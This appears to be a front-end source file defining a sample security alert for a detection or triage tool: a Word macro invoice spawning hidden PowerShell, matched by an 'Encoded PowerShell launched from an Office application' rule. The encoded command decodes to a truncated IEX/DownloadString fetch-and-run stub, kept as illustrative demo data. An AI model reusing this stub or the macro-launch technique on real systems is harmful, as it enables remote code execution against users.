// Example only. It is loaded behind an explicit "Charger un exemple" button and never seeded
// into a user's workspace automatically. The encoded payload is illustrative, not live malware.
export const SAMPLE_ALERT = JSON.stringify(
  {
    _index: 'logs-windows.powershell-default-2026.11.04',
    _id: '7f4c9a2e-3b1d-4a55-9c8e-1d2f4b6a8c90',
    _source: {
      '@timestamp': '2026-11-04T08:12:44.102Z',
      event: {
        category: ['process'],
        type: ['start'],
        action: 'exec',
        code: '4104',
        module: 'powershell',
      },
      host: { name: 'WIN-FIN-042', os: { family: 'windows', version: '10.0.19045' } },
      user: { name: 'a.koffi', domain: 'CORP' },
      process: {
        name: 'powershell.exe',
        executable: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        command_line:
          'powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA',
        parent: { name: 'winword.exe', executable: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE' },
      },
      source: { ip: '10.20.4.18' },
      destination: { ip: '185.199.108.133', port: 443 },
      network: { transport: 'tcp', protocol: 'https' },
      file: { name: 'Facture_Novembre_2026.docm', path: 'C:\\Users\\a.koffi\\Downloads\\Facture_Novembre_2026.docm' },
      rule: {
        name: 'Encoded PowerShell launched from an Office application',
        id: '8c1f3e70-1a2b-11ef-9d4c-0242ac120002',
        description:
          'Detects a PowerShell process with an encoded command whose parent is a Microsoft Office application.',
        severity: 'high',
        risk_score: 73,
        author: 'SOC Detection Engineering',
        updated_at: '2026-10-27T14:21:00.000Z',
      },
      message:
        'A Microsoft Word process launched PowerShell with a base64 encoded command. The host resolved and contacted a public address shortly after.',
      customer: { name: 'Direction Financière' },
    },
  },
  null,
  2,
)
